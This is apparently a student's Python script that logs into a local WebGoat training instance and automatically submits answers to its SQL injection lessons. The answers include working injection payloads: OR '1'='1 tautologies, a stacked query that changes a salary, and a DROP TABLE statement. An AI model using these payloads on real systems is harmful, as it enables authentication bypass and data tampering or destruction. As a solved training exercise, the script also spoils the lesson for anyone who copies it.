import requests

class WebGoatBot:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.lesson = ''

    def login(self, username, password):
        login_url = self.url + '/login'
        data = {'username': username, 'password': password}

        response = self.session.post(login_url, data=data, allow_redirects=False)

        if response.status_code == 302:
            if response.headers['Location'] == self.url + '/welcome.mvc':
                return True
            else:
                return False
        else:
            return False

    def logout(self):
        logout_url = self.url + '/logout'
        # print(f"Tentative de déconnexion : {logout_url}")
        response = self.session.get(logout_url)
        if response.status_code == 200:
            return True
        else:
            return False

    def reset_lessons(self):
        self.session.get(self.url + '/service/restartlesson.mvc')

    def goto_lesson(self, lesson):
        response = self.session.get(self.url + lesson)
        if response.status_code == 200:
            return True
        else:
            return False

    def post_form(self, exercise, data):
        response = self.session.post(self.url + exercise, data=data)
        if response.status_code == 200:
            json_response = response.json()
            if json_response.get('lessonCompleted'):
                return True
        return False



class WebGoatBotSqlInjection(WebGoatBot):
    def __init__(self, url):
       super().__init__(url)

    def do_exercise(self, lesson, exercise, data):
        if self.goto_lesson(lesson):
            return self.post_form(exercise, data)
        else:
            return False


#  login test
if __name__ == "__main__":
    bot = WebGoatBotSqlInjection('http://127.0.0.1:8080/WebGoat')
    username = 'gaelle'
    password = 'azerty'
    lesson = '/SqlInjection.lesson'


    exercises = [
        {
            'exercise': '/SqlInjection/attack2',
            'data': {'query': "SELECT department FROM employees WHERE first_name = 'Bob'"}
        },
        {
            'exercise': '/SqlInjection/attack3',
            'data': {'query': "UPDATE Employees SET department = 'Sales' WHERE first_name = 'Tobi'"}
        },
        {
            'exercise': '/SqlInjection/attack4',
            'data': {'query': "ALTER TABLE employees ADD phone varchar(20)"}
        },
        {
            'exercise': '/SqlInjection/attack5',
            'data': {'query': "GRANT ALL PRIVILEGES ON TABLE grant_rights TO unauthorized_user"}
        },
        {
            'exercise': '/SqlInjection/assignment5a',
            'data': {
                'account': "Smith'",
                'operator': "or",
                'injection': "'1'='1"
            }
        },
        {
            'exercise': '/SqlInjection/assignment5b',
            'data': {
                'login_count': "1",
                'userid': "1 or 1=1",
            }
        },
        {
            'exercise': '/SqlInjection/attack8',
            'data': {
                'name': "Smith' OR '1'='1",
                'auth_tan': "3SL99A' OR '1'='1"
            }
        },
        {
            'exercise': '/SqlInjection/attack9',
            'data': {
                'name': "Smith",
                'auth_tan': "3SL99A'; UPDATE employees SET salary = 90000 WHERE first_name= 'John"
            }
        },
        {
            'exercise': '/SqlInjection/attack10',
            'data': {
                'action_string': "%'; DROP TABLE access_log;--",
            }
        },
    ]

    if bot.login(username, password):
        print("Connexion réussie!")

        for exercise in exercises:
            if bot.do_exercise(lesson, exercise['exercise'], exercise['data']):
                print(f"Exercice {exercise['exercise']} réussi!")
            else:
                print("Échec de l'exercice.")
    else:
        print("Échec de la connexion.")


    if bot.logout():
        print("Déconnexion réussie!")
    else:
        print("Échec de la déconnexion.")

    if bot.reset_lessons():
        print('Réinitialisation éffectuée.')